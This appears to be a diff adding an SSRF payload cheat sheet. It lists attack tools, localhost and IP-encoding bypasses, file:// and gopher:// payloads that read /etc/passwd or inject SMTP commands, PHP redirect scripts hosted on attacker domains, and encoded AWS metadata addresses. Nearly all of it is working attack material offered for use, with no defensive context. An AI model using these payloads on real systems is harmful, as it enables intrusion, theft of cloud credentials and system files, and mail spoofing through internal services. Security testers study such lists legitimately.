@@ -1,0 +1,102 @@
+SSRF
+
+Tools
+SSRFmap - https://github.com/swisskyrepo/SSRFmap.git
+Gopherus - https://github.com/tarunkant/Gopherus.git
+SSRF-Testing - https://github.com/cujanovic/SSRF-Testing
+ssrf-proxy - https://github.com/bcoles/ssrf_proxy
+
+
+localhost payloads
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+http://localhost:80
+http://localhost:443
+http://localhost:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/
+http://[::]:22/
+http://[::]:3128/
+http://0000::1:80/
+http://0000::1:25/
+http://0000::1:22/
+http://0000::1:3128/
+
+Create a subdomain pointing to 192.168.0.1 with DNS A record
+Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+
+Decimal IP location bypass
+http://0177.0.0.1/
+http://2130706433/ 	http://127.0.0.1
+http://3232235521/	http://192.168.0.1
+http://3232235777/ 	http://192.168.1.1
+
+Marlformed url bypass
+localhost:+11211aaa
+localhost:00011211aaaa
+
+empty/Null address bypass
+http://0/
+
+Enclosed Alnum bypass
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+Complete list:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+
+URL Scheme exploitation payloads
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+sftp://evil.dom:11111/
+tftp://evil.dom:69/TESTUDPPACKET
+ldap://localhost:389/%0astats%0aquit
+ldaps://localhost:636/%0astats%0aquit
+gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+Gopher smtp connect-back
+Malicious script on attacker host:
+<?php
+header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
+?>
+http://evil.com/redirect.php.
+Gopher send email smtp
+<?php
+        $commands = array(
+                'HELO victim.com',
+                'MAIL FROM: <admin@victim.pwnd>',
+                'RCPT To: <pwnrship@pwn.you>',
+                'DATA',
+                'Subject: @pwn',
+                'Attack Attack Atack!',
+                '.'
+        );
+        $payload = implode('%0A', $commands);
+        header('Location: gopher://0:25/_'.$payload);
+?>
+
+SSRF to XSS
+
+
+Cloud-based attacks
+AWS payloads
+/latest/meta-data/
+/latest/user-data/
+	-*for more thorough list see aws document in this repo
+HTTP redirect
+Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+Alternate IP encoding
+http://425.510.425.510/ Dotted decimal with overflow
+http://2852039166/ Dotless decimal
+http://7147006462/ Dotless decimal with overflow
+http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+http://0xA9FEA9FE/ Dotless hexadecimal
+http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+http://0251.0376.0251.0376/ Dotted octal
+http://0251.00376.000251.0000376/ Dotted octal with padding
